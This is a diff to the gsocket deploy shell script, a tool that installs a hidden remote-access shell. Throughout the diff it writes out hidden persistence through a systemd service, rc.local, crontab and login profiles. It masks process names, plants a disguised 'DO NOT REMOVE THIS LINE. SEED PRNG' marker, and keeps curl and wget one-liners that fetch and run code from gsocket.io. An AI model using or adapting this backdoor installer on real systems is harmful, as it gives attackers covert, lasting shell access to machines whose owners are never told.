@@ -51,7 +51,7 @@
 URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/"
 [[ -n "$GS_URL_BASE" ]] && URL_BASE="$GS_URL_BASE" # Use user supplied URL_BASE
 URL_DEPLOY="gsocket.io/x"
-GS_VERSION=1.4.34
+# GS_VERSION=1.4.34
 DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
 # DL_CMD="$DL_CRL"
@@ -289,6 +289,8 @@ init_vars()
 
 	SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
 	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
+	SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
+	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"
 
 	DEBUGF "SRC_PKG=$SRC_PKG"
 }
@@ -320,10 +322,8 @@ init_setup()
 
 	NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. #${BIN_HIDDEN_NAME}-kernel"
 
-	SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
-	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"
 	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
-	RCLOCAL_LINE="HOME=$HOME TERM=xterm-256color SHELL=$SHELL GSOCKET_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\""
+	RCLOCAL_LINE="HOME=$HOME TERM=xterm-256color SHELL=$SHELL GS_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\""
 
 	# There is no reliable way to check if a process is running:
 	# - Process might be running under different name. Especially OSX checks for the orginal name
@@ -332,8 +332,8 @@ init_setup()
 	# The best we can do:
 	# 1. If pidof/killall/pkill exist _AND_ daemon is running then do nothing.
 	# 2. Otherwise start gs-bd as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
-	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}')"
-	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || SHELL=$SHELL TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\""
+	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}')"
+	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} ${BIN_HIDDEN_NAME} 2>/dev/null || SHELL=$SHELL TERM=xterm-256color GS_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\""
 
 	# check that xxd is working as expected (alpine linux does not have -r option)
 	if [[ "$(echo "thcwashere" | xxd -ps -c1024 2>/dev/null| xxd -r -ps 2>/dev/null)" = "thcwashere" ]]; then
@@ -423,9 +423,11 @@ uninstall()
 	# Remove systemd service
 	# STOPPING would kill the current login shell. Do not stop it.
 	# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
-	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && { systemctl disable "${BIN_HIDDEN_NAME}" 2>/dev/null && systemctl daemon-reload 2>/dev/null; } 
-	uninstall_rm "${SERVICE_FILE}"
-	uninstall_rm "${SERVICE_DIR}/${SEC_NAME}"
+	[[ -f "${SERVICE_FILE}" ]] && {
+		command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && { systemctl disable "${BIN_HIDDEN_NAME}" 2>/dev/null && systemctl daemon-reload 2>/dev/null; } 
+		uninstall_rm "${SERVICE_FILE}"
+	}
+	uninstall_rm "${SYSTEMD_SEC_FILE}"
 
 	echo -e 1>&2 "${CG}Uninstall complete.${CN}"
 	echo -e 1>&2 "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${CN} to terminate all running shells."
@@ -510,7 +512,7 @@ install_system_systemd()
 	command -v systemctl >/dev/null || return
 	[[ "$(systemctl is-system-running 2>/dev/null)" = *"offline"* ]] &>/dev/null && return
 	if [[ -f "${SERVICE_FILE}" ]]; then
-		IS_INSTALLED=1
+		((IS_INSTALLED+=1))
 		IS_SKIPPED=1
 		if systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null; then
 			IS_GS_RUNNING=1
@@ -530,7 +532,7 @@ Type=simple
 Restart=always
 RestartSec=10
 WorkingDirectory=/root
-ExecStart=/bin/bash -c \"GSOCKET_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
+ExecStart=/bin/bash -c \"GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
 
 [Install]
 WantedBy=multi-user.target" >"${SERVICE_FILE}"
@@ -538,10 +540,10 @@ WantedBy=multi-user.target" >"${SERVICE_FILE}"
 	chmod 600 "${SERVICE_FILE}"
 	gs_secret_write "$SYSTEMD_SEC_FILE"
 
-	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE}"; return; } # did not work... 
+	systemctl enable "${SERVICE_HIDDEN_NAME}" &>/dev/null || { rm -f "${SERVICE_FILE}" "${SYSTEMD_SEC_FILE}"; return; } # did not work... 
 
 	IS_SYSTEMD=1
-	IS_INSTALLED=1
+	((IS_INSTALLED+=1))
 }
 
 # inject a string ($2-) into the 2nd line of a file and retain the
@@ -566,8 +568,10 @@ install_to_file()
 install_system_rclocal()
 {
 	[[ ! -f "${RCLOCAL_FILE}" ]] && return
+	# Some systems have /etc/rc.local but it's not executeable...
+	[[ ! -x "${RCLOCAL_FILE}" ]] && return
 	if grep -F -- "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" &>/dev/null; then
-		IS_INSTALLED=1
+		((IS_INSTALLED+=1))
 		IS_SKIPPED=1
 		SKIP_OUT "Already installed in ${RCLOCAL_FILE}."
 		return	
@@ -580,7 +584,7 @@ install_system_rclocal()
 
 	gs_secret_write "$RCLOCAL_SEC_FILE"
 
-	IS_INSTALLED=1
+	((IS_INSTALLED+=1))
 }
 
 install_system()
@@ -605,7 +609,7 @@ install_user_crontab()
 	command -v crontab >/dev/null || return # no crontab
 	echo -en 2>&1 "Installing access via crontab........................................."
 	if crontab -l 2>/dev/null | grep -F -- "$BIN_HIDDEN_NAME" &>/dev/null; then
-		IS_INSTALLED=1
+		((IS_INSTALLED+=1))
 		IS_SKIPPED=1
 		SKIP_OUT "Already installed in crontab."
 		return
@@ -618,7 +622,7 @@ install_user_crontab()
 	echo "$NOTE_DONOTREMOVE" && \
 	echo "${cr_time} $CRONTAB_LINE") | crontab - 2>/dev/null || { FAIL_OUT; return; }
 
-	IS_INSTALLED=1
+	((IS_INSTALLED+=1))
 	OK_OUT
 }
 
@@ -635,7 +639,7 @@ install_user_profile()
 	echo -en 2>&1 "Installing access via ~/${rc_filename_status:0:15}..............................."
 	[[ -f "${rc_file}" ]] || { touch "${rc_file}"; chmod 600 "${rc_file}"; }
 	if grep -F -- "$BIN_HIDDEN_NAME" "$rc_file" &>/dev/null; then
-		IS_INSTALLED=1
+		((IS_INSTALLED+=1))
 		IS_SKIPPED=1
 		SKIP_OUT "Already installed in ${rc_file}"
 		return
@@ -643,17 +647,18 @@ install_user_profile()
 
 	install_to_file "${rc_file}" "$NOTE_DONOTREMOVE" "${PROFILE_LINE}"
 
-	IS_INSTALLED=1
+	((IS_INSTALLED+=1))
 	OK_OUT
 }
 
 install_user()
 {
-	# Do not use crontab on OSX: It pops a warning to the user
+	# Use crontab if it's not in systemd (but might be in rc.local).
 	if [[ ! $OSTYPE == *darwin* ]]; then
 		install_user_crontab
 	fi
 
+	[[ $IS_INSTALLED -ge 2 ]] && return
 	# install_user_profile
 	for x in "${RC_FN_LIST[@]}"; do
 		install_user_profile "$x"
@@ -765,32 +770,32 @@ gs_access()
 	exit_code "$ret"
 }
 
-gs_update()
-{
-	echo -en 2>&1 "Checking existing binaries............................................"
+# gs_update()
+# {
+# 	echo -en 2>&1 "Checking existing binaries............................................"
 
-	command -v gs-netcat >/dev/null || { FAIL_OUT "gs-netcat not found."; exit 255; }
-	OK_OUT
+# 	command -v gs-netcat >/dev/null || { FAIL_OUT "gs-netcat not found."; exit 255; }
+# 	OK_OUT
 
-	local gsnc_bin
-	gsnc_bin="$(command -v gs-netcat)"
+# 	local gsnc_bin
+# 	gsnc_bin="$(command -v gs-netcat)"
 
-	echo -en 2>&1 "Backup old binaries..................................................."
-	err_log=$(mv -f "${gsnc_bin}" "${gsnc_bin}-old" 2>&1) || { FAIL_OUT "$err_log"; exit 255; }
-	OK_OUT
+# 	echo -en 2>&1 "Backup old binaries..................................................."
+# 	err_log=$(mv -f "${gsnc_bin}" "${gsnc_bin}-old" 2>&1) || { FAIL_OUT "$err_log"; exit 255; }
+# 	OK_OUT
 
-	echo -en 2>&1 "Updating binaries....................................................."
+# 	echo -en 2>&1 "Updating binaries....................................................."
 
-	err_log=$(mv -f "${DSTBIN}" "${gsnc_bin}" 2>&1) || { FAIL_OUT "$err_log"; exit 255; }
-	OK_OUT
+# 	err_log=$(mv -f "${DSTBIN}" "${gsnc_bin}" 2>&1) || { FAIL_OUT "$err_log"; exit 255; }
+# 	OK_OUT
 
-	echo -en 2>&1 "Testing updated binaries.............................................."
-	ver_new="$(gs-netcat -h 2>&1 | grep GS)"
-	[[ "$ver_new" =~ $GS_VERSION ]] || { FAIL_OUT "Wrong version: $ver_new"; exit 255; }
+# 	echo -en 2>&1 "Testing updated binaries.............................................."
+# 	ver_new="$(gs-netcat -h 2>&1 | grep ^Version | sed -E 's/Version (.*),.*/\1/g')"
+# 	[[ "$ver_new" =~ $GS_VERSION ]] || { FAIL_OUT "Wrong version: $ver_new"; exit 255; }
 
-	OK_OUT "Updated to $ver_new"
-	exit 0
-}
+# 	OK_OUT "Updated to $ver_new"
+# 	exit 0
+# }
 
 # Binary is in an executeable directory (no noexec-flag)
 # set IS_TESTBIN_OK if binary worked.
@@ -825,7 +830,7 @@ test_network()
 	# 2. Exit=202 after n seconds. Firewalled/DNS?
 	# 3. Exit=203 if TCP to GSRN is refused.
 	# 3. Exit=61 on GS-Connection refused. (server does not exist)
-	err_log=$(_GSOCKET_SERVER_CHECK_SEC=10 GSOCKET_ARGS="-s ${GS_SECRET}" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
+	err_log=$(_GSOCKET_SERVER_CHECK_SEC=10 GS_ARGS="-s ${GS_SECRET}" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
 	ret=$?
 
 	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
@@ -996,7 +1001,7 @@ gs_start()
 	fi
 
 	if [[ -n "$IS_NEED_START" ]]; then
-		(TERM=xterm-256color GSOCKET_ARGS="-s $GS_SECRET -liD" exec -a "$PROC_HIDDEN_NAME" "$DSTBIN")
+		(TERM=xterm-256color GS_ARGS="-s $GS_SECRET -liD" exec -a "$PROC_HIDDEN_NAME" "$DSTBIN")
 		IS_GS_RUNNING=1
 	fi
 }
@@ -1036,7 +1041,7 @@ WARN_EXECFAIL
 
 [[ -z $S ]] && try_network
 
-[[ -n "$GS_UPDATE" ]] && gs_update
+# [[ -n "$GS_UPDATE" ]] && gs_update
 
 # S= is set. Do not install but connect to remote using S= as secret.
 [[ -n "$S" ]] && gs_access
@@ -1045,8 +1050,8 @@ WARN_EXECFAIL
 # Try to install system wide. This may also start the service.
 [[ -z $GS_NOINST ]] && [[ $UID -eq 0 ]] && install_system
 
-# Try to install to user's login script or crontab
-[[ -z $GS_NOINST ]] && [[ -z "$IS_INSTALLED" ]] && install_user
+# Try to install to user's login script or crontab (if not installed as SYSTEMD)
+[[ -z $GS_NOINST ]] && [[ -z "$IS_INSTALLED" -o -z "$IS_SYSTEMD" ]] && install_user
 
 [[ -n $GS_NOINST ]] && echo -e 2>&1 "GS_NOINST is set. Skipping installation."
 # -----END Install permanentally-----
